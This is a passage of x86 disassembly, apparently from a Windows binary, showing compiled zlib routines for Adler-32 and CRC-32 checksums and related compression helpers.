  4024ec:	8b 74 24 14          	mov    0x14(%esp),%esi
  4024f0:	85 f6                	test   %esi,%esi
  4024f2:	75 07                	jne    0x4024fb
  4024f4:	8d 46 01             	lea    0x1(%esi),%eax
  4024f7:	5e                   	pop    %esi
  4024f8:	5f                   	pop    %edi
  4024f9:	5b                   	pop    %ebx
  4024fa:	c3                   	ret
  4024fb:	83 fb 10             	cmp    $0x10,%ebx
  4024fe:	73 3b                	jae    0x40253b
  402500:	85 db                	test   %ebx,%ebx
  402502:	74 0d                	je     0x402511
  402504:	0f b6 06             	movzbl (%esi),%eax
  402507:	03 c8                	add    %eax,%ecx
  402509:	4b                   	dec    %ebx
  40250a:	46                   	inc    %esi
  40250b:	03 f9                	add    %ecx,%edi
  40250d:	85 db                	test   %ebx,%ebx
  40250f:	75 f3                	jne    0x402504
  402511:	81 f9 f1 ff 00 00    	cmp    $0xfff1,%ecx
  402517:	72 06                	jb     0x40251f
  402519:	81 e9 f1 ff 00 00    	sub    $0xfff1,%ecx
  40251f:	b8 71 80 07 80       	mov    $0x80078071,%eax
  402524:	f7 e7                	mul    %edi
  402526:	c1 ea 0f             	shr    $0xf,%edx
  402529:	8b c2                	mov    %edx,%eax
  40252b:	c1 e0 04             	shl    $0x4,%eax
  40252e:	2b c2                	sub    %edx,%eax
  402530:	03 c7                	add    %edi,%eax
  402532:	5e                   	pop    %esi
  402533:	c1 e0 10             	shl    $0x10,%eax
  402536:	5f                   	pop    %edi
  402537:	0b c1                	or     %ecx,%eax
  402539:	5b                   	pop    %ebx
  40253a:	c3                   	ret
  40253b:	81 fb b0 15 00 00    	cmp    $0x15b0,%ebx
  402541:	0f 82 e2 00 00 00    	jb     0x402629
  402547:	b8 af a9 6e 5e       	mov    $0x5e6ea9af,%eax
  40254c:	f7 e3                	mul    %ebx
  40254e:	55                   	push   %ebp
  40254f:	8b ea                	mov    %edx,%ebp
  402551:	c1 ed 0b             	shr    $0xb,%ebp
  402554:	eb 0a                	jmp    0x402560
  402556:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40255d:	8d 49 00             	lea    0x0(%ecx),%ecx
  402560:	81 eb b0 15 00 00    	sub    $0x15b0,%ebx
  402566:	b8 5b 01 00 00       	mov    $0x15b,%eax
  40256b:	eb 03                	jmp    0x402570
  40256d:	8d 49 00             	lea    0x0(%ecx),%ecx
  402570:	0f b6 16             	movzbl (%esi),%edx
  402573:	03 ca                	add    %edx,%ecx
  402575:	0f b6 56 01          	movzbl 0x1(%esi),%edx
  402579:	03 f9                	add    %ecx,%edi
  40257b:	03 ca                	add    %edx,%ecx
  40257d:	0f b6 56 02          	movzbl 0x2(%esi),%edx
  402581:	03 f9                	add    %ecx,%edi
  402583:	03 ca                	add    %edx,%ecx
  402585:	0f b6 56 03          	movzbl 0x3(%esi),%edx
  402589:	03 f9                	add    %ecx,%edi
  40258b:	03 ca                	add    %edx,%ecx
  40258d:	0f b6 56 04          	movzbl 0x4(%esi),%edx
  402591:	03 f9                	add    %ecx,%edi
  402593:	03 ca                	add    %edx,%ecx
  402595:	0f b6 56 05          	movzbl 0x5(%esi),%edx
  402599:	03 f9                	add    %ecx,%edi
  40259b:	03 ca                	add    %edx,%ecx
  40259d:	0f b6 56 06          	movzbl 0x6(%esi),%edx
  4025a1:	03 f9                	add    %ecx,%edi
  4025a3:	03 ca                	add    %edx,%ecx
  4025a5:	0f b6 56 07          	movzbl 0x7(%esi),%edx
  4025a9:	03 f9                	add    %ecx,%edi
  4025ab:	03 ca                	add    %edx,%ecx
  4025ad:	0f b6 56 08          	movzbl 0x8(%esi),%edx
  4025b1:	03 f9                	add    %ecx,%edi
  4025b3:	03 ca                	add    %edx,%ecx
  4025b5:	0f b6 56 09          	movzbl 0x9(%esi),%edx
  4025b9:	03 f9                	add    %ecx,%edi
  4025bb:	03 ca                	add    %edx,%ecx
  4025bd:	0f b6 56 0a          	movzbl 0xa(%esi),%edx
  4025c1:	03 f9                	add    %ecx,%edi
  4025c3:	03 ca                	add    %edx,%ecx
  4025c5:	0f b6 56 0b          	movzbl 0xb(%esi),%edx
  4025c9:	03 f9                	add    %ecx,%edi
  4025cb:	03 ca                	add    %edx,%ecx
  4025cd:	0f b6 56 0c          	movzbl 0xc(%esi),%edx
  4025d1:	03 f9                	add    %ecx,%edi
  4025d3:	03 ca                	add    %edx,%ecx
  4025d5:	0f b6 56 0d          	movzbl 0xd(%esi),%edx
  4025d9:	03 f9                	add    %ecx,%edi
  4025db:	03 ca                	add    %edx,%ecx
  4025dd:	0f b6 56 0e          	movzbl 0xe(%esi),%edx
  4025e1:	03 f9                	add    %ecx,%edi
  4025e3:	03 ca                	add    %edx,%ecx
  4025e5:	0f b6 56 0f          	movzbl 0xf(%esi),%edx
  4025e9:	03 f9                	add    %ecx,%edi
  4025eb:	03 ca                	add    %edx,%ecx
  4025ed:	03 f9                	add    %ecx,%edi
  4025ef:	83 c6 10             	add    $0x10,%esi
  4025f2:	83 e8 01             	sub    $0x1,%eax
  4025f5:	0f 85 75 ff ff ff    	jne    0x402570
  4025fb:	b8 71 80 07 80       	mov    $0x80078071,%eax
  402600:	f7 e1                	mul    %ecx
  402602:	c1 ea 0f             	shr    $0xf,%edx
  402605:	69 d2 0f 00 ff ff    	imul   $0xffff000f,%edx,%edx
  40260b:	03 ca                	add    %edx,%ecx
  40260d:	b8 71 80 07 80       	mov    $0x80078071,%eax
  402612:	f7 e7                	mul    %edi
  402614:	c1 ea 0f             	shr    $0xf,%edx
  402617:	69 d2 0f 00 ff ff    	imul   $0xffff000f,%edx,%edx
  40261d:	03 fa                	add    %edx,%edi
  40261f:	83 ed 01             	sub    $0x1,%ebp
  402622:	0f 85 38 ff ff ff    	jne    0x402560
  402628:	5d                   	pop    %ebp
  402629:	85 db                	test   %ebx,%ebx
  40262b:	0f 84 d2 00 00 00    	je     0x402703
  402631:	83 fb 10             	cmp    $0x10,%ebx
  402634:	0f 82 94 00 00 00    	jb     0x4026ce
  40263a:	8b c3                	mov    %ebx,%eax
  40263c:	c1 e8 04             	shr    $0x4,%eax
  40263f:	90                   	nop
  402640:	0f b6 16             	movzbl (%esi),%edx
  402643:	03 ca                	add    %edx,%ecx
  402645:	0f b6 56 01          	movzbl 0x1(%esi),%edx
  402649:	03 f9                	add    %ecx,%edi
  40264b:	03 ca                	add    %edx,%ecx
  40264d:	0f b6 56 02          	movzbl 0x2(%esi),%edx
  402651:	03 f9                	add    %ecx,%edi
  402653:	03 ca                	add    %edx,%ecx
  402655:	0f b6 56 03          	movzbl 0x3(%esi),%edx
  402659:	03 f9                	add    %ecx,%edi
  40265b:	03 ca                	add    %edx,%ecx
  40265d:	0f b6 56 04          	movzbl 0x4(%esi),%edx
  402661:	03 f9                	add    %ecx,%edi
  402663:	03 ca                	add    %edx,%ecx
  402665:	0f b6 56 05          	movzbl 0x5(%esi),%edx
  402669:	03 f9                	add    %ecx,%edi
  40266b:	03 ca                	add    %edx,%ecx
  40266d:	0f b6 56 06          	movzbl 0x6(%esi),%edx
  402671:	03 f9                	add    %ecx,%edi
  402673:	03 ca                	add    %edx,%ecx
  402675:	0f b6 56 07          	movzbl 0x7(%esi),%edx
  402679:	03 f9                	add    %ecx,%edi
  40267b:	03 ca                	add    %edx,%ecx
  40267d:	0f b6 56 08          	movzbl 0x8(%esi),%edx
  402681:	03 f9                	add    %ecx,%edi
  402683:	03 ca                	add    %edx,%ecx
  402685:	0f b6 56 09          	movzbl 0x9(%esi),%edx
  402689:	03 f9                	add    %ecx,%edi
  40268b:	03 ca                	add    %edx,%ecx
  40268d:	0f b6 56 0a          	movzbl 0xa(%esi),%edx
  402691:	03 f9                	add    %ecx,%edi
  402693:	03 ca                	add    %edx,%ecx
  402695:	0f b6 56 0b          	movzbl 0xb(%esi),%edx
  402699:	03 f9                	add    %ecx,%edi
  40269b:	03 ca                	add    %edx,%ecx
  40269d:	0f b6 56 0c          	movzbl 0xc(%esi),%edx
  4026a1:	03 f9                	add    %ecx,%edi
  4026a3:	03 ca                	add    %edx,%ecx
  4026a5:	0f b6 56 0d          	movzbl 0xd(%esi),%edx
  4026a9:	03 f9                	add    %ecx,%edi
  4026ab:	03 ca                	add    %edx,%ecx
  4026ad:	0f b6 56 0e          	movzbl 0xe(%esi),%edx
  4026b1:	03 f9                	add    %ecx,%edi
  4026b3:	03 ca                	add    %edx,%ecx
  4026b5:	0f b6 56 0f          	movzbl 0xf(%esi),%edx
  4026b9:	03 f9                	add    %ecx,%edi
  4026bb:	03 ca                	add    %edx,%ecx
  4026bd:	83 eb 10             	sub    $0x10,%ebx
  4026c0:	03 f9                	add    %ecx,%edi
  4026c2:	83 c6 10             	add    $0x10,%esi
  4026c5:	83 e8 01             	sub    $0x1,%eax
  4026c8:	0f 85 72 ff ff ff    	jne    0x402640
  4026ce:	85 db                	test   %ebx,%ebx
  4026d0:	74 0d                	je     0x4026df
  4026d2:	0f b6 06             	movzbl (%esi),%eax
  4026d5:	03 c8                	add    %eax,%ecx
  4026d7:	4b                   	dec    %ebx
  4026d8:	46                   	inc    %esi
  4026d9:	03 f9                	add    %ecx,%edi
  4026db:	85 db                	test   %ebx,%ebx
  4026dd:	75 f3                	jne    0x4026d2
  4026df:	b8 71 80 07 80       	mov    $0x80078071,%eax
  4026e4:	f7 e1                	mul    %ecx
  4026e6:	c1 ea 0f             	shr    $0xf,%edx
  4026e9:	69 d2 0f 00 ff ff    	imul   $0xffff000f,%edx,%edx
  4026ef:	03 ca                	add    %edx,%ecx
  4026f1:	b8 71 80 07 80       	mov    $0x80078071,%eax
  4026f6:	f7 e7                	mul    %edi
  4026f8:	c1 ea 0f             	shr    $0xf,%edx
  4026fb:	69 d2 0f 00 ff ff    	imul   $0xffff000f,%edx,%edx
  402701:	03 fa                	add    %edx,%edi
  402703:	8b c7                	mov    %edi,%eax
  402705:	5e                   	pop    %esi
  402706:	c1 e0 10             	shl    $0x10,%eax
  402709:	5f                   	pop    %edi
  40270a:	0b c1                	or     %ecx,%eax
  40270c:	5b                   	pop    %ebx
  40270d:	c3                   	ret
  40270e:	cc                   	int3
  40270f:	cc                   	int3
  402710:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  402714:	b8 71 80 07 80       	mov    $0x80078071,%eax
  402719:	f7 e1                	mul    %ecx
  40271b:	c1 ea 0f             	shr    $0xf,%edx
  40271e:	69 d2 f1 ff 00 00    	imul   $0xfff1,%edx,%edx
  402724:	2b ca                	sub    %edx,%ecx
  402726:	53                   	push   %ebx
  402727:	8b d9                	mov    %ecx,%ebx
  402729:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  40272d:	0f b7 c1             	movzwl %cx,%eax
  402730:	55                   	push   %ebp
  402731:	56                   	push   %esi
  402732:	8b f0                	mov    %eax,%esi
  402734:	0f af f3             	imul   %ebx,%esi
  402737:	57                   	push   %edi
  402738:	8b 7c 24 18          	mov    0x18(%esp),%edi
  40273c:	0f b7 d7             	movzwl %di,%edx
  40273f:	8d ac 10 f0 ff 00 00 	lea    0xfff0(%eax,%edx,1),%ebp
  402746:	b8 71 80 07 80       	mov    $0x80078071,%eax
  40274b:	f7 e6                	mul    %esi
  40274d:	c1 ea 0f             	shr    $0xf,%edx
  402750:	69 d2 f1 ff 00 00    	imul   $0xfff1,%edx,%edx
  402756:	c1 e9 10             	shr    $0x10,%ecx
  402759:	2b ca                	sub    %edx,%ecx
  40275b:	c1 ef 10             	shr    $0x10,%edi
  40275e:	03 cf                	add    %edi,%ecx
  402760:	2b cb                	sub    %ebx,%ecx
  402762:	8d 84 0e f1 ff 00 00 	lea    0xfff1(%esi,%ecx,1),%eax
  402769:	81 fd f1 ff 00 00    	cmp    $0xfff1,%ebp
  40276f:	76 14                	jbe    0x402785
  402771:	81 ed f1 ff 00 00    	sub    $0xfff1,%ebp
  402777:	81 fd f1 ff 00 00    	cmp    $0xfff1,%ebp
  40277d:	76 06                	jbe    0x402785
  40277f:	81 ed f1 ff 00 00    	sub    $0xfff1,%ebp
  402785:	3d e2 ff 01 00       	cmp    $0x1ffe2,%eax
  40278a:	76 05                	jbe    0x402791
  40278c:	2d e2 ff 01 00       	sub    $0x1ffe2,%eax
  402791:	3d f1 ff 00 00       	cmp    $0xfff1,%eax
  402796:	76 05                	jbe    0x40279d
  402798:	2d f1 ff 00 00       	sub    $0xfff1,%eax
  40279d:	5f                   	pop    %edi
  40279e:	c1 e0 10             	shl    $0x10,%eax
  4027a1:	5e                   	pop    %esi
  4027a2:	0b c5                	or     %ebp,%eax
  4027a4:	5d                   	pop    %ebp
  4027a5:	5b                   	pop    %ebx
  4027a6:	c3                   	ret
  4027a7:	cc                   	int3
  4027a8:	cc                   	int3
  4027a9:	cc                   	int3
  4027aa:	cc                   	int3
  4027ab:	cc                   	int3
  4027ac:	cc                   	int3
  4027ad:	cc                   	int3
  4027ae:	cc                   	int3
  4027af:	cc                   	int3
  4027b0:	83 ec 38             	sub    $0x38,%esp
  4027b3:	8b 4c 24 48          	mov    0x48(%esp),%ecx
  4027b7:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  4027bb:	8b 44 24 44          	mov    0x44(%esp),%eax
  4027bf:	53                   	push   %ebx
  4027c0:	8b 5c 24 44          	mov    0x44(%esp),%ebx
  4027c4:	6a 38                	push   $0x38
  4027c6:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  4027ca:	8b 4c 24 54          	mov    0x54(%esp),%ecx
  4027ce:	68 a4 b2 41 00       	push   $0x41b2a4
  4027d3:	89 54 24 18          	mov    %edx,0x18(%esp)
  4027d7:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4027db:	8b 03                	mov    (%ebx),%eax
  4027dd:	51                   	push   %ecx
  4027de:	8d 54 24 10          	lea    0x10(%esp),%edx
  4027e2:	52                   	push   %edx
  4027e3:	89 44 24 24          	mov    %eax,0x24(%esp)
  4027e7:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%esp)
  4027ee:	00 
  4027ef:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%esp)
  4027f6:	00 
  4027f7:	c7 44 24 3c 00 00 00 	movl   $0x0,0x3c(%esp)
  4027fe:	00 
  4027ff:	e8 fc 26 00 00       	call   0x404f00
  402804:	83 c4 10             	add    $0x10,%esp
  402807:	85 c0                	test   %eax,%eax
  402809:	75 49                	jne    0x402854
  40280b:	56                   	push   %esi
  40280c:	8d 44 24 08          	lea    0x8(%esp),%eax
  402810:	6a 04                	push   $0x4
  402812:	50                   	push   %eax
  402813:	e8 f8 0a 00 00       	call   0x403310
  402818:	8b f0                	mov    %eax,%esi
  40281a:	83 c4 08             	add    $0x8,%esp
  40281d:	83 fe 01             	cmp    $0x1,%esi
  402820:	74 1e                	je     0x402840
  402822:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  402826:	51                   	push   %ecx
  402827:	e8 c4 12 00 00       	call   0x403af0
  40282c:	83 c4 04             	add    $0x4,%esp
  40282f:	b8 fb ff ff ff       	mov    $0xfffffffb,%eax
  402834:	85 f6                	test   %esi,%esi
  402836:	74 1b                	je     0x402853
  402838:	8b c6                	mov    %esi,%eax
  40283a:	5e                   	pop    %esi
  40283b:	5b                   	pop    %ebx
  40283c:	83 c4 38             	add    $0x38,%esp
  40283f:	c3                   	ret
  402840:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  402844:	8d 44 24 08          	lea    0x8(%esp),%eax
  402848:	50                   	push   %eax
  402849:	89 13                	mov    %edx,(%ebx)
  40284b:	e8 a0 12 00 00       	call   0x403af0
  402850:	83 c4 04             	add    $0x4,%esp
  402853:	5e                   	pop    %esi
  402854:	5b                   	pop    %ebx
  402855:	83 c4 38             	add    $0x38,%esp
  402858:	c3                   	ret
  402859:	cc                   	int3
  40285a:	cc                   	int3
  40285b:	cc                   	int3
  40285c:	cc                   	int3
  40285d:	cc                   	int3
  40285e:	cc                   	int3
  40285f:	cc                   	int3
  402860:	8b 44 24 10          	mov    0x10(%esp),%eax
  402864:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  402868:	8b 54 24 08          	mov    0x8(%esp),%edx
  40286c:	6a ff                	push   $0xffffffff
  40286e:	50                   	push   %eax
  40286f:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402873:	51                   	push   %ecx
  402874:	52                   	push   %edx
  402875:	50                   	push   %eax
  402876:	e8 35 ff ff ff       	call   0x4027b0
  40287b:	83 c4 14             	add    $0x14,%esp
  40287e:	c3                   	ret
  40287f:	cc                   	int3
  402880:	8b 44 24 04          	mov    0x4(%esp),%eax
  402884:	8b c8                	mov    %eax,%ecx
  402886:	8b d0                	mov    %eax,%edx
  402888:	c1 e9 0e             	shr    $0xe,%ecx
  40288b:	c1 ea 0c             	shr    $0xc,%edx
  40288e:	03 c8                	add    %eax,%ecx
  402890:	8d 44 0a 0b          	lea    0xb(%edx,%ecx,1),%eax
  402894:	c3                   	ret
  402895:	cc                   	int3
  402896:	cc                   	int3
  402897:	cc                   	int3
  402898:	cc                   	int3
  402899:	cc                   	int3
  40289a:	cc                   	int3
  40289b:	cc                   	int3
  40289c:	cc                   	int3
  40289d:	cc                   	int3
  40289e:	cc                   	int3
  40289f:	cc                   	int3
  4028a0:	b8 b0 b2 41 00       	mov    $0x41b2b0,%eax
  4028a5:	c3                   	ret
  4028a6:	cc                   	int3
  4028a7:	cc                   	int3
  4028a8:	cc                   	int3
  4028a9:	cc                   	int3
  4028aa:	cc                   	int3
  4028ab:	cc                   	int3
  4028ac:	cc                   	int3
  4028ad:	cc                   	int3
  4028ae:	cc                   	int3
  4028af:	cc                   	int3
  4028b0:	56                   	push   %esi
  4028b1:	8b f2                	mov    %edx,%esi
  4028b3:	f7 d0                	not    %eax
  4028b5:	85 f6                	test   %esi,%esi
  4028b7:	74 27                	je     0x4028e0
  4028b9:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4028c0:	f6 c1 03             	test   $0x3,%cl
  4028c3:	74 1b                	je     0x4028e0
  4028c5:	0f b6 11             	movzbl (%ecx),%edx
  4028c8:	33 d0                	xor    %eax,%edx
  4028ca:	81 e2 ff 00 00 00    	and    $0xff,%edx
  4028d0:	c1 e8 08             	shr    $0x8,%eax
  4028d3:	33 04 95 b0 b2 41 00 	xor    0x41b2b0(,%edx,4),%eax
  4028da:	41                   	inc    %ecx
  4028db:	83 ee 01             	sub    $0x1,%esi
  4028de:	75 e0                	jne    0x4028c0
  4028e0:	53                   	push   %ebx
  4028e1:	57                   	push   %edi
  4028e2:	83 fe 20             	cmp    $0x20,%esi
  4028e5:	0f 82 20 02 00 00    	jb     0x402b0b
  4028eb:	8b fe                	mov    %esi,%edi
  4028ed:	c1 ef 05             	shr    $0x5,%edi
  4028f0:	33 01                	xor    (%ecx),%eax
  4028f2:	83 c1 04             	add    $0x4,%ecx
  4028f5:	8b d0                	mov    %eax,%edx
  4028f7:	c1 ea 10             	shr    $0x10,%edx
  4028fa:	8b d8                	mov    %eax,%ebx
  4028fc:	c1 eb 08             	shr    $0x8,%ebx
  4028ff:	81 e2 ff 00 00 00    	and    $0xff,%edx
  402905:	8b 14 95 b0 b6 41 00 	mov    0x41b6b0(,%edx,4),%edx
  40290c:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  402912:	33 14 9d b0 ba 41 00 	xor    0x41bab0(,%ebx,4),%edx
  402919:	8b d8                	mov    %eax,%ebx
  40291b:	c1 eb 18             	shr    $0x18,%ebx
  40291e:	33 14 9d b0 b2 41 00 	xor    0x41b2b0(,%ebx,4),%edx
  402925:	25 ff 00 00 00       	and    $0xff,%eax
  40292a:	33 14 85 b0 be 41 00 	xor    0x41beb0(,%eax,4),%edx
  402931:	83 c1 04             	add    $0x4,%ecx
  402934:	33 51 fc             	xor    -0x4(%ecx),%edx
  402937:	83 c1 04             	add    $0x4,%ecx
  40293a:	8b c2                	mov    %edx,%eax
  40293c:	c1 e8 10             	shr    $0x10,%eax
  40293f:	8b da                	mov    %edx,%ebx
  402941:	c1 eb 08             	shr    $0x8,%ebx
  402944:	25 ff 00 00 00       	and    $0xff,%eax
  402949:	8b 04 85 b0 b6 41 00 	mov    0x41b6b0(,%eax,4),%eax
  402950:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  402956:	33 04 9d b0 ba 41 00 	xor    0x41bab0(,%ebx,4),%eax
  40295d:	8b da                	mov    %edx,%ebx
  40295f:	c1 eb 18             	shr    $0x18,%ebx
  402962:	33 04 9d b0 b2 41 00 	xor    0x41b2b0(,%ebx,4),%eax
  402969:	81 e2 ff 00 00 00    	and    $0xff,%edx
  40296f:	33 04 95 b0 be 41 00 	xor    0x41beb0(,%edx,4),%eax
  402976:	83 c1 04             	add    $0x4,%ecx
  402979:	33 41 f8             	xor    -0x8(%ecx),%eax
  40297c:	83 c1 04             	add    $0x4,%ecx
  40297f:	8b d0                	mov    %eax,%edx
  402981:	c1 ea 10             	shr    $0x10,%edx
  402984:	8b d8                	mov    %eax,%ebx
  402986:	81 e2 ff 00 00 00    	and    $0xff,%edx
  40298c:	8b 14 95 b0 b6 41 00 	mov    0x41b6b0(,%edx,4),%edx
  402993:	c1 eb 08             	shr    $0x8,%ebx
  402996:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  40299c:	33 14 9d b0 ba 41 00 	xor    0x41bab0(,%ebx,4),%edx
  4029a3:	8b d8                	mov    %eax,%ebx
  4029a5:	c1 eb 18             	shr    $0x18,%ebx
  4029a8:	33 14 9d b0 b2 41 00 	xor    0x41b2b0(,%ebx,4),%edx
  4029af:	25 ff 00 00 00       	and    $0xff,%eax
  4029b4:	33 14 85 b0 be 41 00 	xor    0x41beb0(,%eax,4),%edx
  4029bb:	83 c1 04             	add    $0x4,%ecx
  4029be:	33 51 f4             	xor    -0xc(%ecx),%edx
  4029c1:	8b c2                	mov    %edx,%eax
  4029c3:	c1 e8 10             	shr    $0x10,%eax
  4029c6:	8b da                	mov    %edx,%ebx
  4029c8:	c1 eb 08             	shr    $0x8,%ebx
  4029cb:	25 ff 00 00 00       	and    $0xff,%eax
  4029d0:	8b 04 85 b0 b6 41 00 	mov    0x41b6b0(,%eax,4),%eax
  4029d7:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  4029dd:	33 04 9d b0 ba 41 00 	xor    0x41bab0(,%ebx,4),%eax
  4029e4:	8b da                	mov    %edx,%ebx
  4029e6:	c1 eb 18             	shr    $0x18,%ebx
  4029e9:	33 04 9d b0 b2 41 00 	xor    0x41b2b0(,%ebx,4),%eax
  4029f0:	81 e2 ff 00 00 00    	and    $0xff,%edx
  4029f6:	33 04 95 b0 be 41 00 	xor    0x41beb0(,%edx,4),%eax
  4029fd:	33 41 f8             	xor    -0x8(%ecx),%eax
  402a00:	8b d0                	mov    %eax,%edx
  402a02:	c1 ea 10             	shr    $0x10,%edx
  402a05:	8b d8                	mov    %eax,%ebx
  402a07:	81 e2 ff 00 00 00    	and    $0xff,%edx
  402a0d:	8b 14 95 b0 b6 41 00 	mov    0x41b6b0(,%edx,4),%edx
  402a14:	c1 eb 08             	shr    $0x8,%ebx
  402a17:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  402a1d:	33 14 9d b0 ba 41 00 	xor    0x41bab0(,%ebx,4),%edx
  402a24:	8b d8                	mov    %eax,%ebx
  402a26:	c1 eb 18             	shr    $0x18,%ebx
  402a29:	33 14 9d b0 b2 41 00 	xor    0x41b2b0(,%ebx,4),%edx
  402a30:	25 ff 00 00 00       	and    $0xff,%eax
  402a35:	33 14 85 b0 be 41 00 	xor    0x41beb0(,%eax,4),%edx
  402a3c:	33 51 fc             	xor    -0x4(%ecx),%edx
  402a3f:	8b c2                	mov    %edx,%eax
  402a41:	c1 e8 10             	shr    $0x10,%eax
  402a44:	25 ff 00 00 00       	and    $0xff,%eax
  402a49:	8b da                	mov    %edx,%ebx
  402a4b:	8b 04 85 b0 b6 41 00 	mov    0x41b6b0(,%eax,4),%eax
  402a52:	c1 eb 08             	shr    $0x8,%ebx
  402a55:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  402a5b:	33 04 9d b0 ba 41 00 	xor    0x41bab0(,%ebx,4),%eax
  402a62:	8b da                	mov    %edx,%ebx
  402a64:	c1 eb 18             	shr    $0x18,%ebx
  402a67:	33 04 9d b0 b2 41 00 	xor    0x41b2b0(,%ebx,4),%eax
  402a6e:	81 e2 ff 00 00 00    	and    $0xff,%edx
  402a74:	33 04 95 b0 be 41 00 	xor    0x41beb0(,%edx,4),%eax
  402a7b:	83 c1 04             	add    $0x4,%ecx
  402a7e:	33 41 fc             	xor    -0x4(%ecx),%eax
  402a81:	83 c1 04             	add    $0x4,%ecx
  402a84:	8b d0                	mov    %eax,%edx
  402a86:	8b d8                	mov    %eax,%ebx
  402a88:	c1 ea 10             	shr    $0x10,%edx
  402a8b:	c1 eb 08             	shr    $0x8,%ebx
  402a8e:	81 e2 ff 00 00 00    	and    $0xff,%edx
  402a94:	8b 14 95 b0 b6 41 00 	mov    0x41b6b0(,%edx,4),%edx
  402a9b:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  402aa1:	33 14 9d b0 ba 41 00 	xor    0x41bab0(,%ebx,4),%edx
  402aa8:	8b d8                	mov    %eax,%ebx
  402aaa:	c1 eb 18             	shr    $0x18,%ebx
  402aad:	33 14 9d b0 b2 41 00 	xor    0x41b2b0(,%ebx,4),%edx
  402ab4:	25 ff 00 00 00       	and    $0xff,%eax
  402ab9:	33 14 85 b0 be 41 00 	xor    0x41beb0(,%eax,4),%edx
  402ac0:	83 ee 20             	sub    $0x20,%esi
  402ac3:	33 51 fc             	xor    -0x4(%ecx),%edx
  402ac6:	8b c2                	mov    %edx,%eax
  402ac8:	c1 e8 10             	shr    $0x10,%eax
  402acb:	25 ff 00 00 00       	and    $0xff,%eax
  402ad0:	8b 04 85 b0 b6 41 00 	mov    0x41b6b0(,%eax,4),%eax
  402ad7:	8b da                	mov    %edx,%ebx
  402ad9:	c1 eb 08             	shr    $0x8,%ebx
  402adc:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  402ae2:	33 04 9d b0 ba 41 00 	xor    0x41bab0(,%ebx,4),%eax
  402ae9:	8b da                	mov    %edx,%ebx
  402aeb:	c1 eb 18             	shr    $0x18,%ebx
  402aee:	33 04 9d b0 b2 41 00 	xor    0x41b2b0(,%ebx,4),%eax
  402af5:	81 e2 ff 00 00 00    	and    $0xff,%edx
  402afb:	33 04 95 b0 be 41 00 	xor    0x41beb0(,%edx,4),%eax
  402b02:	83 ef 01             	sub    $0x1,%edi
  402b05:	0f 85 e5 fd ff ff    	jne    0x4028f0
  402b0b:	83 fe 04             	cmp    $0x4,%esi
  402b0e:	72 50                	jb     0x402b60
  402b10:	8b d6                	mov    %esi,%edx
  402b12:	c1 ea 02             	shr    $0x2,%edx
  402b15:	33 01                	xor    (%ecx),%eax
  402b17:	83 c1 04             	add    $0x4,%ecx
  402b1a:	8b f8                	mov    %eax,%edi
  402b1c:	c1 ef 10             	shr    $0x10,%edi
  402b1f:	81 e7 ff 00 00 00    	and    $0xff,%edi
  402b25:	8b 3c bd b0 b6 41 00 	mov    0x41b6b0(,%edi,4),%edi
  402b2c:	8b d8                	mov    %eax,%ebx
  402b2e:	c1 eb 08             	shr    $0x8,%ebx
  402b31:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  402b37:	33 3c 9d b0 ba 41 00 	xor    0x41bab0(,%ebx,4),%edi
  402b3e:	8b d8                	mov    %eax,%ebx
  402b40:	c1 eb 18             	shr    $0x18,%ebx
  402b43:	33 3c 9d b0 b2 41 00 	xor    0x41b2b0(,%ebx,4),%edi
  402b4a:	25 ff 00 00 00       	and    $0xff,%eax
  402b4f:	33 3c 85 b0 be 41 00 	xor    0x41beb0(,%eax,4),%edi
  402b56:	83 ee 04             	sub    $0x4,%esi
  402b59:	83 ea 01             	sub    $0x1,%edx
  402b5c:	8b c7                	mov    %edi,%eax
  402b5e:	75 b5                	jne    0x402b15
  402b60:	5f                   	pop    %edi
  402b61:	5b                   	pop    %ebx
  402b62:	85 f6                	test   %esi,%esi
  402b64:	74 25                	je     0x402b8b
  402b66:	eb 08                	jmp    0x402b70
  402b68:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  402b6f:	90                   	nop
  402b70:	0f b6 11             	movzbl (%ecx),%edx
  402b73:	33 d0                	xor    %eax,%edx
  402b75:	81 e2 ff 00 00 00    	and    $0xff,%edx
  402b7b:	c1 e8 08             	shr    $0x8,%eax
  402b7e:	33 04 95 b0 b2 41 00 	xor    0x41b2b0(,%edx,4),%eax
  402b85:	41                   	inc    %ecx
  402b86:	83 ee 01             	sub    $0x1,%esi
  402b89:	75 e5                	jne    0x402b70
  402b8b:	f7 d0                	not    %eax
  402b8d:	5e                   	pop    %esi
  402b8e:	c3                   	ret
  402b8f:	cc                   	int3
  402b90:	56                   	push   %esi
  402b91:	8b f2                	mov    %edx,%esi
  402b93:	57                   	push   %edi
  402b94:	8b d0                	mov    %eax,%edx
  402b96:	81 e2 00 ff 00 00    	and    $0xff00,%edx
  402b9c:	8b f8                	mov    %eax,%edi
  402b9e:	c1 e7 10             	shl    $0x10,%edi
  402ba1:	03 d7                	add    %edi,%edx
  402ba3:	8b f8                	mov    %eax,%edi
  402ba5:	c1 e2 08             	shl    $0x8,%edx
  402ba8:	c1 ef 08             	shr    $0x8,%edi
  402bab:	81 e7 00 ff 00 00    	and    $0xff00,%edi
  402bb1:	03 d7                	add    %edi,%edx
  402bb3:	c1 e8 18             	shr    $0x18,%eax
  402bb6:	03 d0                	add    %eax,%edx
  402bb8:	f7 d2                	not    %edx
  402bba:	85 f6                	test   %esi,%esi
  402bbc:	74 21                	je     0x402bdf
